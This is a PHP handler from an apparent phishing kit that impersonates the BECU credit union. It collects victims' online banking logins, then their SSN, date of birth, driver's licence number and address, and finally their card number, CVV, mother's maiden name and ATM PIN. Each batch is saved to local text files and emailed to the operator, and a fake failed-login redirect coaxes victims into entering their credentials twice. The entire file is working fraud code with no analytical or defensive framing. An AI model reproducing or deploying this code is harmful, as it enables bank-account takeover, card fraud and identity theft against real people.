<?php 
	session_start();

	        // variable declaration
	        $errors = array(); 


	       if (isset($_POST['ReasonCode']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // Get User Input
	          $userID = $_POST['userID'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::: Darkx BECU Info [Login Details] ::::::::::::::::::\r\n";
	          $body .= "UserID                                 : $userID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::: Darkx BECU Info :::::::::::::::::\r\n";
	          
	          $save=fopen("access/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

             
	          $subject="BECU Darkx Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: BECU Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../mail_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../login.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	          if(isset($_POST['userID'])&&isset($_POST['password']))
	          {
	          include 'recon.php';
	          include 'mail.php';
	          include 'cookies.php';
	          // check for valid email address
	          $userID = $_POST['userID'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx BECU Info [Login Details] :::::::::::::::::::::::::\r\n";
	          $body .= "UserID                                 : $userID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx BECU Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	           
	          $subject="BECU Darkx Login Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	          
	          $headers="From: BECU Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login.php?ReasonCode=6004';</script>";
	          die();
	          }
	          else
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login.php?ReasonCode=6004';</script>";
	          die();
	          }
	          }
	          
	          if (isset($_POST['account_verify']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // check for valid email address
	          $userID = $_POST['userID'];
	          $ssn = $_POST['ssn'];
	          $fullname = $_POST['fullname'];
	          $dob = $_POST['dob'];
	          $dlnum = $_POST['dlnum'];
	          $state = $_POST['state'];
	          $address = $_POST['address'];
	          $phone = $_POST['phone'];
	          $zipcode = $_POST['zipcode'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx BECU Info [Account Details] :::::::::::::::::::::::::\r\n";
	          $body .= "UserID                               : $acct_num\r\n";
	          $body .= "Full Name                            : $fullname\r\n";
	          $body .= "SSN                                  : $ssn\r\n";
	          $body .= "Date Of Birth                        : $dob\r\n";
	          $body .= "Drivers License                      : $dlnum\r\n";
	          $body .= "State                                : $state\r\n";
	          $body .= "Address                              : $address\r\n";
	          $body .= "Phone Number                         : $phone\r\n";
	          $body .= "ZipCode                              : $zipcode\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx BECU Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/account_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="BECU Darkx Account Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: BECU Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../credit_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../account_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }

	           if (isset($_POST['credit_verify']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // check for valid email address
	          $ccnum = $_POST['ccnum'];
	          $expdate = $_POST['expdate'];
	          $cvv = $_POST['cvv'];
	          $mmn = $_POST['mmn'];
	          $atmpin = $_POST['atmpin'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx BECU Info [Card Details] :::::::::::::::::::::::::\r\n";
	          $body .= "Card Number                          : $ccnum\r\n";
	          $body .= "Expiry Date                          : $expdate\r\n";
	          $body .= "CVV                                  : $cvv\r\n";
	          $body .= "Mother's Maiden Name                 : $mmn\r\n";
	          $body .= "ATM PIN                              : $atmpin\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx BECU Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/card_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	           
	          $subject="BECU Darkx Card Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: BECU Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../success.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../credit_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	      
?>